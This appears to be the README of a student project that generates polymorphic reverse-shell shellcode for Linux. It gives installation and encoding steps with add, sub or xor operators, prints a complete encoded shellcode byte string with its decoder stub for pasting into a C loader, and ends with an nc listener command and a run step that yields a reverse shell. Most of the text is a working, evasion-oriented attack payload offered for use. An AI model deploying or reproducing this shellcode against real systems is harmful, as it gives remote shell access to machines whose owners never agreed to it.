# Simple Shellcode Reverse Shell Generator with Polymorphism

This tool has been build for a school project. You can use it to generate simple shellcodes with a single modification using operators. 

In the folder `asm_codes` you can find the assembly code used to generate the base payload and the decoder. 

## Installation

```bash
pip install -r requirements.txt
```

## How to use 

First of  all you have to use `encode.py` to get your payload. You can use three operators  `add` , `sub`  or`xor` .

```bash
./encode.py -o xor -n 10
```

You should get the payload in your clipboard, otherwise there is a generated file `encoded_shellcode`. 

Replace the value of `const char code[]` in the `shellcode.c` file such as : 

```c
const char code[] = 
  "\xeb\x11\x5e\x31\xc9\xb1\x5b\x80\x74\x0e\xff\x0a\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6a\x60\x6c\x52\x60\x0b\x51\x3b\xc3\x5b\x60\x0b\x60\x08\x83\xeb\xc7\x8a\x83\xcd\x62\x75\x0b\x0b\x0b\x6c\x62\x0e\xd8\x6c\x60\x08\x83\xeb\x60\x1a\x5b\x5d\x83\xeb\xba\x6c\xb9\x09\xc7\x8a\x3b\xc3\xba\x35\x83\xf1\xc7\x8a\xba\x35\x4b\xc7\x8a\xba\x35\x4b\xc7\x8a\xba\x01\x3b\xd1\x59\x62\x25\x25\x79\x62\x62\x25\x68\x63\x64\x83\xe9\x3b\xc3\x3b\xd8\xc7\x8a\x89\xce\x3a\x6b";
```

Run a nc listener in the port `1234` :

```bash
nc -lvp 1234
```

Launch `out.sh` and you should get a reverse shell.

